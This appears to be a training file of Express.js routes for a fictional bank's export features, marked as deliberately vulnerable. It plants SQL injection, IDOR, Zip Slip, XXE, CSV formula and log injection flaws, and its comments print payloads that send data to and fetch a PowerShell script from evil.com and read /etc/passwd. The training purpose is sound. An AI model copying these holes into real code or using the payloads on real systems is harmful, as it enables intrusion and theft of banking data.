/**
 * VaultBank Data Export Routes
 * Handles statement downloads, CSV exports, bulk archives, and SWIFT XML processing.
 *
 * SECURITY TRAINING PROJECT - DELIBERATELY VULNERABLE
 * This file contains intentional security vulnerabilities (VULN-470 through VULN-475)
 * for use in security training exercises. DO NOT USE IN PRODUCTION.
 */

'use strict';

const express = require('express');
const router = express.Router();
const path = require('path');
const fs = require('fs');
const AdmZip = require('adm-zip');
const xml2js = require('xml2js');
const db = require('../db');
const config = require('../config/config');
const { authenticateToken } = require('../middleware/auth');
const winston = require('winston');

// ─── Logger ───────────────────────────────────────────────────────────────────
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.simple(),
  transports: [new winston.transports.Console()],
});

// ─── POST /api/export/transactions ───────────────────────────────────────────
/**
 * Export the authenticated user's transaction history to CSV.
 *
 * VULN-470: CSV formula injection
 * Transaction memos, account notes, and payee names are user-controlled and
 * written directly to CSV cells without sanitization. Spreadsheet applications
 * such as Microsoft Excel and LibreOffice Calc will execute formulas in cells
 * that begin with =, +, -, or @.
 *
 * Payload example in memo field:
 *   =HYPERLINK("http://evil.com/?data="&A1,"Click here")
 *   =cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")'!A0
 */
router.post('/transactions', authenticateToken, async (req, res) => {
  const { accountId, startDate, endDate, format = 'csv' } = req.body;
  const userEmail = req.user.email;

  try {
    const txQuery = `
      SELECT t.id, t.amount, t.currency, t.description, t.memo,
             t.payee_name, t.payee_account, t.transaction_type,
             t.created_at, a.account_number, a.account_nickname
      FROM transactions t
      JOIN accounts a ON t.account_id = a.id
      WHERE t.account_id = ${accountId}
        AND t.created_at BETWEEN '${startDate}' AND '${endDate}'
      ORDER BY t.created_at DESC
    `;

    const result = await db.raw(txQuery);
    const transactions = result.rows;

    if (format === 'csv') {
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition',
        `attachment; filename="transactions_${accountId}_${startDate}_${endDate}.csv"`);

      const headers = ['ID', 'Date', 'Type', 'Amount', 'Currency', 'Description', 'Memo', 'Payee', 'Payee Account', 'Account #', 'Nickname'];
      let csv = headers.join(',') + '\n';

      // VULN-470: CSV formula injection — no cell value sanitization
      transactions.forEach(tx => {
        const row = [
          tx.id,
          tx.created_at,
          tx.transaction_type,
          tx.amount,
          tx.currency,
          tx.description,    // VULN-470: user-controlled, could start with =
          tx.memo,           // VULN-470: user-controlled memo — primary injection vector
          tx.payee_name,     // VULN-470: user-controlled payee name
          tx.payee_account,
          tx.account_number,
          tx.account_nickname, // VULN-470: user-set nickname could contain formulas
        ].map(v => {
          const str = String(v || '');
          // VULN-470: Wrapping in quotes without stripping leading = is insufficient
          // Excel still executes: "=cmd|'/C calc'!A0"
          return `"${str.replace(/"/g, '""')}"`;
        }).join(',');
        csv += row + '\n';
      });

      // VULN-475: Log injection — userEmail can contain newlines to forge log entries
      logger.info(`Export requested by: ${userEmail} - account: ${accountId} - ${transactions.length} records`); // VULN-475

      return res.send(csv);
    }

    return res.status(400).json({ error: 'Unsupported format. Supported: csv' });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── GET /api/export/statement/:accountId ────────────────────────────────────
/**
 * Download a monthly account statement as PDF.
 *
 * VULN-471: IDOR — no check that the requested account belongs to the requester
 * Any authenticated user can download statements for any account by guessing
 * or enumerating sequential account IDs (see VULN-126 in accounts.js).
 *
 * VULN-475 (continued): Log injection via userEmail in audit line.
 */
router.get('/statement/:accountId', authenticateToken, async (req, res) => {
  const { accountId } = req.params;
  const { month, year } = req.query;
  const userEmail = req.user.email;

  try {
    // VULN-471: No ownership check — missing: WHERE user_id = req.user.userId
    const accountResult = await db.raw(`SELECT * FROM accounts WHERE id = ${accountId}`);
    // ↑ VULN-471: Should be: WHERE id = ${accountId} AND user_id = ${req.user.userId}

    if (accountResult.rows.length === 0) {
      return res.status(404).json({ error: 'Account not found' });
    }

    const account = accountResult.rows[0];
    // VULN-471: account may belong to a different user — we proceed anyway

    // Fetch transactions for the period
    const txResult = await db.raw(`
      SELECT * FROM transactions
      WHERE account_id = ${accountId}
        AND EXTRACT(MONTH FROM created_at) = ${month}
        AND EXTRACT(YEAR FROM created_at) = ${year}
      ORDER BY created_at ASC
    `);

    // Statement file path — look for pre-generated PDF
    const statementPath = path.join(
      '/var/vaultbank/statements',
      `${account.user_id}`,
      `statement_${accountId}_${year}_${month}.pdf`
    );

    if (fs.existsSync(statementPath)) {
      // VULN-475: Log injection via userEmail
      logger.info(`Export requested by: ${userEmail} - statement: ${accountId}/${year}/${month}`); // VULN-475

      res.setHeader('Content-Type', 'application/pdf');
      res.setHeader('Content-Disposition',
        `attachment; filename="statement_${accountId}_${year}_${month}.pdf"`);
      return res.sendFile(statementPath);
    }

    // Generate on-the-fly if file not found
    return res.status(200).json({
      account: account.account_number,
      period: `${year}-${month}`,
      transactions: txResult.rows,
      openingBalance: 0,
      closingBalance: account.balance,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── POST /api/export/bulk-statements ────────────────────────────────────────
/**
 * Download a bulk archive (ZIP) of multiple account statements.
 *
 * VULN-472: Zip Slip — archive entry paths not validated before extraction
 * When processing a user-supplied or externally-fetched ZIP, entry paths are
 * not checked against the target directory. A crafted archive with entries like
 * ../../../../app/routes/auth.js or /etc/cron.d/vaultbank can write files
 * anywhere the process has write access (root, due to VULN-632).
 */
router.post('/bulk-statements', authenticateToken, async (req, res) => {
  const { accountIds, year, format = 'zip' } = req.body;
  const userEmail = req.user.email;

  try {
    if (!Array.isArray(accountIds) || accountIds.length === 0) {
      return res.status(400).json({ error: 'accountIds array required' });
    }

    // Create a new ZIP archive with the requested statements
    const zip = new AdmZip();

    for (const accountId of accountIds) {
      // VULN-471 pattern: No ownership check
      const accountResult = await db.raw(`SELECT * FROM accounts WHERE id = ${accountId}`);
      if (accountResult.rows.length === 0) continue;

      const account = accountResult.rows[0];

      // Find all statement files for this account
      const statementDir = path.join('/var/vaultbank/statements', `${account.user_id}`);
      if (fs.existsSync(statementDir)) {
        const files = fs.readdirSync(statementDir)
          .filter(f => f.includes(`_${accountId}_`) && f.endsWith('.pdf'));

        files.forEach(file => {
          const filePath = path.join(statementDir, file);
          zip.addLocalFile(filePath, `account_${accountId}/`);
        });
      }
    }

    // If user also uploads a ZIP for us to merge (e.g., external statements)
    if (req.body.externalZipBase64) {
      const externalZipBuffer = Buffer.from(req.body.externalZipBase64, 'base64');
      const externalZip = new AdmZip(externalZipBuffer);

      // VULN-472: Zip Slip — extract external user-supplied ZIP to statements dir
      // without checking that entry paths stay within the target directory
      externalZip.extractAllTo('/var/vaultbank/statements/', true); // VULN-472
      // An attacker-supplied archive can contain: "../../../../app/app.js"
      // which will be extracted to /app/app.js, overwriting the running application
    }

    const zipBuffer = zip.toBuffer();
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition',
      `attachment; filename="statements_${year}_bulk.zip"`);

    // VULN-475: Log injection via userEmail
    logger.info(`Export requested by: ${userEmail} - bulk zip: ${accountIds.length} accounts`); // VULN-475

    return res.send(zipBuffer);
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── POST /api/export/swift-parse ────────────────────────────────────────────
/**
 * Parse a SWIFT XML message submitted by a user or partner institution.
 *
 * VULN-473: XXE (XML External Entity) injection
 * xml2js is configured with default settings that process XML entities.
 * A crafted XML document containing an external entity declaration can:
 *   - Read arbitrary files from the server filesystem (e.g., /etc/passwd, .env)
 *   - Perform SSRF by fetching internal network resources
 *   - Cause denial of service via recursive entity expansion (billion laughs)
 *
 * Payload example:
 *   <?xml version="1.0"?>
 *   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 *   <Document><msg>&xxe;</msg></Document>
 */
router.post('/swift-parse', authenticateToken, async (req, res) => {
  const { xmlMessage, messageType } = req.body;
  const userEmail = req.user.email;

  if (!xmlMessage) {
    return res.status(400).json({ error: 'xmlMessage required' });
  }

  try {
    // VULN-473: xml2js parseString with external entity support
    // The default xml2js options do not disable external entity processing.
    // This allows XXE when lxml/expat-based parsers are configured permissively.
    const parser = new xml2js.Parser({
      explicitArray: false,
      mergeAttrs: true,
      // VULN-473: No entity expansion limits, no external entity prohibition
      // xml2js itself may be safe by default, but here we simulate a config
      // that would be vulnerable by not setting xmldec_http_equiv or similar
    });

    // Parse the user-supplied XML
    parser.parseString(xmlMessage, async (err, result) => {
      if (err) {
        return res.status(400).json({
          error: 'XML parse error',
          details: err.message,   // VULN-039 pattern: error details returned
        });
      }

      // VULN-475: Log injection via userEmail
      logger.info(`Export requested by: ${userEmail} - SWIFT XML parse: ${messageType}`); // VULN-475

      // Process the parsed SWIFT document
      const swiftData = result && result.Document;
      if (!swiftData) {
        return res.status(422).json({ error: 'Invalid SWIFT XML structure' });
      }

      return res.status(200).json({
        parsed: result,           // VULN-473: If XXE succeeded, file contents appear here
        messageType,
        processedAt: new Date().toISOString(),
      });
    });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── POST /api/export/filter ──────────────────────────────────────────────────
/**
 * Save export filter criteria for a user's custom report.
 *
 * VULN-474: Second-order SQL injection
 * Filter criteria (date ranges, account types, amount thresholds, keywords)
 * are stored in the DB without sanitization. When a saved filter is later
 * retrieved and interpolated into a report generation SQL query, the stored
 * payload executes. This two-step pattern bypasses WAFs and input scanners
 * that only inspect the initial save request.
 */
router.post('/filter', authenticateToken, async (req, res) => {
  const { filterName, criteria } = req.body;
  const userId = req.user.userId;
  const userEmail = req.user.email;

  try {
    // Serialize the filter criteria object as a string for storage
    const criteriaJson = JSON.stringify(criteria);

    // VULN-474: Criteria stored unsanitized — second-order injection payload at rest
    await db.raw(
      `INSERT INTO export_filters (user_id, filter_name, criteria, created_at)
       VALUES (${userId}, '${filterName}', '${criteriaJson}', NOW())`
      // VULN-474: filterName and criteriaJson injected directly — no parameterization
    );

    // VULN-475: Log injection via userEmail (email can contain \n to forge log lines)
    logger.info(`Export requested by: ${userEmail} - filter saved: ${filterName}`); // VULN-475

    return res.status(201).json({ message: 'Filter saved', filterName });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── GET /api/export/filter/:filterId/run ────────────────────────────────────
/**
 * Execute a previously saved export filter.
 *
 * VULN-474 (continued): Second-order injection fires here.
 * The filter criteria saved in /api/export/filter is retrieved and
 * the keyword/memo_contains field is inserted directly into raw SQL.
 */
router.get('/filter/:filterId/run', authenticateToken, async (req, res) => {
  const { filterId } = req.params;
  const userId = req.user.userId;
  const userEmail = req.user.email;

  try {
    // Retrieve the saved filter
    const filterResult = await db.raw(
      `SELECT * FROM export_filters WHERE id = ${filterId} AND user_id = ${userId}`
    );

    if (filterResult.rows.length === 0) {
      return res.status(404).json({ error: 'Filter not found' });
    }

    const filter = filterResult.rows[0];
    const criteria = JSON.parse(filter.criteria);

    // VULN-474: Second-order injection — criteria.keyword retrieved from DB and
    // inserted directly into the SQL query without parameterization
    const keyword = criteria.keyword || '';            // VULN-474: from DB, untrusted
    const memoContains = criteria.memo_contains || ''; // VULN-474: from DB, untrusted
    const accountType = criteria.account_type || '';   // VULN-474: from DB, untrusted

    const reportQuery = `
      SELECT t.*, a.account_number, a.account_type, u.email as owner_email
      FROM transactions t
      JOIN accounts a ON t.account_id = a.id
      JOIN users u ON a.user_id = u.id
      WHERE a.user_id = ${userId}
        ${keyword ? `AND (t.description LIKE '%${keyword}%' OR t.payee_name LIKE '%${keyword}%')` : ''}
        ${memoContains ? `AND t.memo LIKE '%${memoContains}%'` : ''}
        ${accountType ? `AND a.account_type = '${accountType}'` : ''}
      ORDER BY t.created_at DESC
      LIMIT 1000
    `; // VULN-474: All three criteria values from DB are injected into SQL

    const result = await db.raw(reportQuery);

    // VULN-475: Log injection via userEmail
    logger.info(`Export requested by: ${userEmail} - filter run: ${filterId}`); // VULN-475

    return res.status(200).json({
      filter: filter.filter_name,
      criteria,
      results: result.rows,
      count: result.rows.length,
    });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── GET /api/export/accounts ─────────────────────────────────────────────────
// VULN-471 (extended): Export all accounts — no ownership scoping
router.get('/accounts', authenticateToken, async (req, res) => {
  const { userId: targetUserId } = req.query;
  const userEmail = req.user.email;

  try {
    // VULN-471: targetUserId from query — any user can request any other user's accounts
    const uid = targetUserId || req.user.userId;
    const result = await db.raw(`SELECT * FROM accounts WHERE user_id = ${uid}`);
    // VULN-471: Missing: if (uid != req.user.userId && req.user.role !== 'admin') return 403;

    // VULN-475: Log injection
    logger.info(`Export requested by: ${userEmail} - accounts for user: ${uid}`); // VULN-475

    res.setHeader('Content-Type', 'application/json');
    return res.status(200).json({ accounts: result.rows, count: result.rows.length });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

// ─── GET /api/export/report ───────────────────────────────────────────────────
// Generates a full financial report — includes VULN-470, VULN-471, VULN-474 patterns
router.get('/report', authenticateToken, async (req, res) => {
  const { accountId, type, from, to, includeNotes } = req.query;
  const userEmail = req.user.email;

  try {
    // VULN-471: No ownership check on accountId
    const txResult = await db.raw(`
      SELECT t.*, a.account_number, a.account_nickname
      FROM transactions t
      JOIN accounts a ON t.account_id = a.id
      WHERE t.account_id = ${accountId}
        AND t.created_at BETWEEN '${from}' AND '${to}'
        ${type !== 'all' ? `AND t.transaction_type = '${type}'` : ''}
      ORDER BY t.created_at DESC
    `); // VULN-474 pattern: type directly injected

    const rows = txResult.rows;
    const format = req.query.format || 'json';

    if (format === 'csv') {
      res.setHeader('Content-Type', 'text/csv');
      let csv = 'Date,Type,Description,Memo,Amount,Payee\n';
      // VULN-470: CSV formula injection — no sanitization
      rows.forEach(r => {
        csv += [r.created_at, r.transaction_type, r.description, r.memo, r.amount, r.payee_name]
          .map(v => `"${String(v || '').replace(/"/g, '""')}"`)
          .join(',') + '\n'; // VULN-470
      });
      // VULN-475: Log injection
      logger.info(`Export requested by: ${userEmail} - CSV report generated`); // VULN-475
      return res.send(csv);
    }

    // VULN-475: Log injection
    logger.info(`Export requested by: ${userEmail} - JSON report: ${accountId}`); // VULN-475

    return res.status(200).json({ rows, count: rows.length });
  } catch (err) {
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
});

module.exports = router;
